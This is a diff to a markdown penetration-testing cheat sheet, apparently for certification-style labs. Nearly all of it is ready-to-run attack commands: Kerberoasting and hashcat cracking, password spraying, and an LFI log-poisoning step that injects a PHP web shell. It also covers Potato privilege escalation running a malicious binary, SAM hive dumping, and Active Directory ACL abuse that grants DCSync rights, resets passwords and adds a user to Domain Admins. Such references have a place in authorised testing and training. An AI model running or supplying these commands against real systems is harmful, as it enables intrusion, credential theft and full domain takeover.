@@ -83,7 +83,7 @@ python3 printnightmare.py domain.local/user:password@$ip '\\$tun0\winreconpack\t
 
 #### Search SMB Known Version Vulnerabilities
 
-#### Check For Shares using
+#### Check For Shares Using Null Sessions
 
 ```
 smbclient -N -L //$ip/
@@ -191,6 +191,10 @@ ldapenum -d $domain
 ldapsearch -v -x -b "DC=domain,DC=local" -H "ldap://$ip" "(objectclass=*)"
 ```
 
+```
+windapsearch --dc-ip $ip -u "" -U
+```
+
 #### Test for zeroLogon
 
 ```
@@ -203,9 +207,13 @@ secretsdump.py -just-dc $domain/dc-name\$@$ip
 
 #### Enumerate Users
 
+Compile usernames 
+
 ```
 /opt/username-anarchy/username-anarchy --input-file ./test-names.txt
 ```
+
+find valid users
 
 ```
 kerbrute userenum /usr/share/wordlists/seclists/Usernames/Names/names.txt -d $domain --dc $ip
@@ -221,13 +229,52 @@ GetNPUsers.py $domain/ -no-pass -usersfile /usr/share/seclists/Usernames/Names/n
 
 ### Active Directory Testing (With Creds)
 
-```
-ldapenum -d $domain -u user -p password
-```
+#### Bloodhound Hunting
 
 ```
 bloodhound-python -u username -p password  -d $domain -ns $ip -c all
 ```
+
+```
+neo4j start
+```
+
+```
+/opt/bloodhound/BloodHound-linux-x64/BloodHound --no-sandbox 2>1 /dev/null &
+```
+
+
+#### Kerberoasting
+
+```
+python3 /usr/local/bin/GetUserSPNs.py domain.com/user:password -dc-ip $ip -request
+```
+
+```
+hashcat -d 2 krb5tgs.txt -m 13100 -a 0 /usr/share/wordlists/rockyou.txt
+```
+
+#### Test for information disclosure
+
+```
+ldapenum -d $domain -u user -p password
+```
+
+
+#### Password Spraying
+
+Kerbrute
+
+```
+kerbrute passwordspray -d domain.com --dc $ip users.txt
+```
+
+CrackMapExec
+
+```
+cme smb $ip -u users.txt -p 'password'
+```
+
 
 ### Web Application Testing
 
@@ -317,6 +364,20 @@ nikto -h http://$ip
 
 #### Local File inclusion
 
+```
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u http://$ip/site/index.php?page=FUZZ
+```
+
+```
+curl http://$ip/ -A "<?php system(\$_GET['cmd']);?>"
+```
+
+Windows
+
+```
+curl http://$ip/site/index.php\?page=../../path/to/log\&cmd=ipconfig
+```
+
 #### Remote File inclusion
 
 #### SQL injection
@@ -361,6 +422,9 @@ windows-exploit-suggester.py --systeminfo /tmp/systeminfo.txt -d /opt/winreconpa
 
 ```
 cmdkey /list
+```
+
+```
 runas /savecred /user:someuser whoami.exe
 ```
 
@@ -370,7 +434,7 @@ runas /savecred /user:someuser whoami.exe
 whoami /priv
 ```
 
-**SeBackupPrivilege**
+#### SeBackupPrivilege
 
 ```
 reg.exe save hklm\sam sam.save
@@ -384,7 +448,7 @@ reg.exe save hklm\system system.save
 secretsdump.py -sam sam.save -system system.save local
 ```
 
-**SeRestorePrivilege**
+#### SeRestorePrivilege
 
 ```
 SeRestoreAbuse.exe "cmd /c net user thescriptkid thescriptkid /add"
@@ -398,9 +462,9 @@ SeRestoreAbuse.exe "cmd /c net localgroup administrators thescriptkid /add"
 secretsdump.py domain.local/user:password@$ip
 ```
 
-**SeImpersonatePrivilege OR SeAssignPrimaryToken**
+#### SeImpersonatePrivilege OR SeAssignPrimaryToken
 
-**RoguePotato**
+##### RoguePotato
 
 If the machine is >= Windows 10 1809 & Windows Server 2019
 
@@ -408,11 +472,13 @@ If the machine is >= Windows 10 1809 & Windows Server 2019
 socat tcp-listen:135,reuseaddr,fork tcp:Windowsip:9999
 ```
 
+Transfer a malicious binary or nc.exe before running the following command
+
 ```
 RoguePotato.exe -r Kali-ip -e "C:\full\path\to\malicious.exe" -l 9999
 ```
 
-**JuicyPotato**
+##### JuicyPotato
 
 If the machine is < Windows 10 1809 < Windows Server 2019\*
 
@@ -420,25 +486,25 @@ If the machine is < Windows 10 1809 < Windows Server 2019\*
 juicypotato.exe -l 1337 -p c:\full\path\to\malicious.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83} OR {4991d34b-80a1-4291-83b6-3328366b9097}
 ```
 
-**PrintSpoofer**
+##### PrintSpoofer
 
 ```
 printspoofer.exe -c "C:\full\path\to\malicious.exe" -i
 ```
 
-**HotPotato**
+##### HotPotato
 
 Windows 7, 8, 10, Server 2008, and Server 2012
 
-**SeDebugPrivilege**
+#### SeDebugPrivilege
 
-**SeShutdownPrivilege**
+#### SeShutdownPrivilege
 
 ```
 shutdown /r /t 0
 ```
 
-**SeTakeOwndershipPrivilege**
+#### SeTakeOwndershipPrivilege
 
 ### Test For alwayselevated
 
@@ -463,11 +529,11 @@ msiexec /quiet /qn /i C:\Windows\Temp\thescriptkid.msi
 ### Test For Insecure Sam and System backups
 
 ```
-accesschk.exe -qlv C:\Windows\repair\Sam
+.\accesschk.exe -qlv C:\Windows\repair\Sam
 ```
 
 ```
-accesschk.exe -qlv C:\Windows\repair\System
+.\accesschk.exe -qlv C:\Windows\repair\System
 ```
 
 ### Non-default Programs Discovery
@@ -476,6 +542,10 @@ This may reveal vulnerable server software or client software to elevate privile
 
 ```
 cmd /c REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+```
+
+```
+dir "C:\ProgramData"
 ```
 
 ```
@@ -491,7 +561,15 @@ Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match
 ```
 
 ```
-accesschk.exe -uws "Everyone" "C:\Program Files"
+Get-ChildItem "C:\Program Files (x86)" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+```
+
+```
+.\accesschk.exe -uws "Everyone" "C:\Program Files"
+```
+
+```
+.\accesschk.exe -uws "Everyone" "C:\Program Files (x86)
 ```
 
 ### Test For Plaintext passwords
@@ -609,7 +687,7 @@ wmic service get name,displayname,pathname,startmode
 ```
 
 ```
-accesschk.exe /accepteula -uwcqv someuser *
+.\accesschk.exe /accepteula -uwcqv someuser *
 ```
 
 ```
@@ -619,7 +697,7 @@ sc.exe qc someservice
 #### Insecure Service Executables
 
 ```
-accesschk.exe -ulvqws everyone "C:\program files"
+.\accesschk.exe -ulvqws everyone "C:\program files"
 ```
 
 Or
@@ -637,7 +715,7 @@ sc qc someservice
 ```
 
 ```
-accesschk.exe -qlcv someservice
+.\accesschk.exe -qlcv someservice
 ```
 
 ```
@@ -667,11 +745,11 @@ sc stop/start OR shutdown /r /t 0
 #### Insecure Service Permissions
 
 ```
-accesschk.exe /accepteula -uwcqv someuser *
+.\accesschk.exe /accepteula -uwcqv someuser *
 ```
 
 ```
-accesschk.exe /accepteula -qlcv someservice
+.\accesschk.exe /accepteula -qlcv someservice
 ```
 
 ```
@@ -689,7 +767,7 @@ sc stop/start someservice
 #### Weak Registry Permissions
 
 ```
-accesschk.exe -ulvqkws grouporuser HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services
+.\accesschk.exe -ulvqkws grouporuser HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services
 ```
 
 ```
@@ -706,12 +784,18 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\regservice /v ImagePath /t REG_EX
 
 ### Test For Scheduled Tasks
 
+Useful to have time
+
+```
+Get-Date
+```
+
 ```
 schtasks /query /fo list /v | findstr /c:"User:" /c:"Run:" /c:"TaskName:" /c:"Start Time:" /c:"Last Run Time:" /c:"Start Time:"
 ```
 
 ```
-schtasks /query /tn sometask /fo list /v
+schtasks /query /tn \path\to\sometask /fo list /v
 ```
 
 ```
@@ -735,7 +819,7 @@ schtasks /run /tn sometask
 ### Test For StartUp Apps
 
 ```
-accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 ```
 
 ### Test For Insecure GUI Apps
@@ -764,6 +848,156 @@ DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
 ```
 
 ### Windows Active Directory
+
+```
+. .\PowerView.ps1
+```
+
+#### Abuse Weak Access Control Lists (ACLs)
+
+Find ACLs of interest whether it be the current compromised user, or users found. start with current user.
+
+```
+Find-InterestingDomainAcl -ResolveGUIDs | where-object {$_.identityreferencename -like "*CompromisedUser*"}
+```
+
+```
+Find-InterestingDomainAcl -ResolveGUIDs | where-object {$_.ActiveDirectoryRights -like "*GenericAll*"} | Where-Object {$_.identityreferenceclass -ne "computer"}
+```
+
+##### Write DACL
+
+```
+$SecPassword = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUser,$SecPassword
+```
+
+```
+Add-ObjectACL -PrincipalIdentity compromiseduser -Credential $cred -Rights DCSync
+```
+
+```
+secretsdumps.py $domain/user@$ip
+```
+
+##### GetChangesAll (DCSync)
+
+```
+secretsdump.py domain/user@ip
+```
+
+Or use Mimikatz
+
+##### ReadGMSApassword
+
+Remotely. *may need to use ntpdate $domain if you get clockscrew error*
+
+```
+python2 /opt/gMSADumper/gMSADumper.py -d $domain -u CompromisedUser -p Password
+```
+
+Locally with EXE
+
+```
+.\GMSAPasswordReader.exe --AccountName 'ReadGMSApassword_Rights_To_User'
+```
+
+##### ForceChangePassword
+
+```
+$CompromisedUserName = 'CompromisedUserName'
+```
+
+```
+$CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
+```
+
+```
+$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserName,$CompromisedUserPass
+```
+
+```
+$LateralEscUserPass = ConvertTo-SecureString 'LateralEscUserPass' -AsPlainText -Force
+```
+
+```
+Set-DomainUserPassword -Identity LateralEscUserName -AccountPassword $LateralEscUserPass -Credential $Cred
+```
+
+##### GenericAll
+
+```
+$CompromisedUserName = 'CompromisedUserName'
+```
+
+```
+$CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
+```
+
+```
+$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserName,$CompromisedUserPass
+```
+
+```
+Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity LateralEscUserName -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'password' -force)} -Credential $cred
+```
+
+##### GenericWrite
+
+Use this for reverseshell using scriptpath=, enumeration, or use serviceprincipalname= for kerberoast
+
+```ps1
+$CompromisedUserName = 'CompromisedUserName'
+```
+
+```
+$CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
+```
+
+```
+$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserName,$CompromisedUserPass
+```
+
+```
+Set-DomainObject -Credential $Cred -Identity LateralEscUserName -SET @{serviceprincipalname='thescriptkid/thescriptkid'}
+```
+
+```
+Get-DomainSPNTicket -Credential $Cred LateralEscUserName | fl
+```
+
+OR
+
+```
+Set-DomainObject -Credential $Cred -Identity LateralEscUserName -SET @{scriptpath='C:\\path\\to\\script.ps1'}
+```
+
+
+##### WriteOwner
+
+```ps1
+$CompromisedUserName = 'CompromisedUserName'
+```
+
+```
+$CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
+```
+
+```
+$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserName,$CompromisedUserPass
+```
+
+```
+Set-DomainObjectOwner -Credential $Cred -Identity "Domain Admins" -OwnerIdentity CompromisedUser
+```
+
+```
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -PrincipalIdentity CompromisedUser -Rights All
+```
+
+```
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'CompromisedUser' -Credential $Cred
+```
 
 #### Overpass The Hash
 
